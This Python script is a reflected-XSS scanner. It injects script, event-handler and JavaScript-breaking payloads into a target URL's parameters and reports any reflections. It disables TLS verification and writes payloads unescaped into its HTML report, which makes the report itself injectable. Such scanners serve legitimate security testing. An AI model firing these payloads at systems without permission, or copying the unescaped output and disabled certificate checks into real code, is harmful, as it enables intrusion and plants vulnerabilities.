# main.py
import argparse
import random
import string
from dataclasses import dataclass
from typing import Dict, List, Literal, Optional, Tuple
import requests


ContextType = Literal["text", "attr-value", "attr-name", "js"]

@dataclass
class ReflectionFinding:
    url: str
    method: str
    param: str
    payload: str
    context_sent: ContextType
    context_detected: Optional[ContextType]
    evidence_snippet: str



# 1) PAYLOAD GENERATOR

class PayloadGenerator:
    def __init__(self, marker: str = "XSSMARK", randomize: bool = True):
        self.marker = marker
        self.randomize = randomize

        self.base_payloads: Dict[ContextType, List[str]] = {
            "text": [
                f"{self.marker}",
                f"<script>alert('{self.marker}')</script>",
                f"<img src=x onerror=alert('{self.marker}')>",
            ],
            "attr-value": [
                f"\" onmouseover=\"alert('{self.marker}')",
                f"' autofocus onfocus=\"alert('{self.marker}')",
                f"javascript:alert('{self.marker}')",
            ],
            "attr-name": [
                f"{self.marker}-attr",
                f"data-{self.marker}",
                f"onxss-{self.marker}",
            ],
            "js": [
                f"';alert('{self.marker}');//",
                f"\";alert('{self.marker}');//",
                f"`;alert('{self.marker}`;//",
            ],
        }

    def _rand_suffix(self, size: int = 4) -> str:
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=size))

    def get_payloads(self, context: ContextType) -> List[str]:
        base = self.base_payloads.get(context, [])
        payloads = []
        for t in base:
            suffix = self._rand_suffix() if self.randomize else ""
            payloads.append(t.replace(self.marker, self.marker + suffix))
        return payloads


# 2) SCANNER


class XSSScanner:
    def __init__(self, base_url: str, method: str = "GET", headers: Optional[Dict[str, str]] = None):
        self.base_url = base_url
        self.method = method.upper()
        self.headers = headers or {}
        self.payload_gen = PayloadGenerator()

    def scan(self, params: List[str], param_context_map: Dict[str, ContextType],
             body_template: Optional[Dict[str, str]] = None) -> List[ReflectionFinding]:

        findings = []

        for param in params:
            context = param_context_map.get(param, "text")
            payloads = self.payload_gen.get_payloads(context)

            for payload in payloads:
                try:
                    resp_text, final_url = self._send_request(param, payload, body_template)
                except Exception as e:
                    print(f"[!] Error sending request: {e}")
                    continue

                if payload in resp_text:
                    snippet = self._extract_snippet(resp_text, payload)
                    findings.append(ReflectionFinding(
                        url=final_url,
                        method=self.method,
                        param=param,
                        payload=payload,
                        context_sent=context,
                        context_detected=context,
                        evidence_snippet=snippet,
                    ))

        return findings

    def _send_request(self, param: str, payload: str, body_template: Optional[Dict[str, str]]):
        if self.method == "GET":
            resp = requests.get(
                self.base_url,
                params={param: payload},
                headers=self.headers,
                verify=False
            )
        else:
            data = dict(body_template or {})
            data[param] = payload
            resp = requests.post(
                self.base_url,
                data=data,
                headers=self.headers,
                verify=False
            )
        return resp.text, resp.url

    @staticmethod
    def _extract_snippet(html: str, payload: str, window: int = 80):
        idx = html.find(payload)
        if idx == -1:
            return ""
        start = max(0, idx - window)
        end = idx + len(payload) + window
        return html[start:end].replace("\n", "\\n")


# 3) REPORTING

def print_terminal_report(findings: List[ReflectionFinding]):
    if not findings:
        print("[*] No reflected XSS found.")
        return

    print("\n=== Reflected XSS Report ===\n")
    for i, f in enumerate(findings, 1):
        print(f"[{i}] {f.method} {f.url}")
        print(f"    Param   : {f.param}")
        print(f"    Payload : {f.payload}")
        print(f"    Context : {f.context_sent}")
        print(f"    Evidence:")
        print(f"        {f.evidence_snippet}")
        print("-" * 60)

def write_html_report(findings: List[ReflectionFinding], path: str):
    with open(path, "w", encoding="utf-8") as f:
        f.write("<html><head><title>XSS Report</title></head><body>")
        f.write("<h1>Reflected XSS Report</h1>")

        if not findings:
            f.write("<p>No reflected XSS found.</p></body></html>")
            return

        f.write("<table border='1' cellpadding='4' cellspacing='0'>")
        f.write("<tr><th>#</th><th>URL</th><th>Param</th><th>Payload</th><th>Context</th><th>Evidence</th></tr>")

        for i, fnd in enumerate(findings, 1):
            f.write("<tr>")
            f.write(f"<td>{i}</td>")
            f.write(f"<td>{fnd.url}</td>")
            f.write(f"<td>{fnd.param}</td>")
            f.write(f"<td>{fnd.payload}</td>")
            f.write(f"<td>{fnd.context_sent}</td>")
            f.write(f"<td><pre>{fnd.evidence_snippet}</pre></td>")
            f.write("</tr>")

        f.write("</table></body></html>")




DEFAULT_PARAMS = ["q", "id", "username", "query", "page"]

def parse_context_map(raw: str) -> Dict[str, ContextType]:
    mapping = {}
    if not raw:
        return mapping
    for entry in raw.split(","):
        if ":" in entry:
            name, ctx = entry.split(":", 1)
            mapping[name.strip()] = ctx.strip()
    return mapping


def main():
    parser = argparse.ArgumentParser(description="Single-file Reflected XSS Scanner (No Cookie Support)")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("--context-map", default="", help='Example: "q:text,id:attr-name"')
    parser.add_argument("--header", action="append", default=[], help='Example: "User-Agent: Scanner"')
    parser.add_argument("--html-report", default="", help="Path to save HTML report")

    args = parser.parse_args()

    params = DEFAULT_PARAMS
    context_map = parse_context_map(args.context_map)

    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    scanner = XSSScanner(
        base_url=args.url,
        method=args.method,
        headers=headers,
    )

    body_template = {} if args.method == "POST" else None

    findings = scanner.scan(
        params=params,
        param_context_map=context_map,
        body_template=body_template,
    )

    print("\n")
    print_terminal_report(findings)
    print("\n")

    if args.html_report:
        write_html_report(findings, args.html_report)
        print(f"[*] HTML report saved to: {args.html_report}")
        print("\n")


if __name__ == "__main__":
    main()
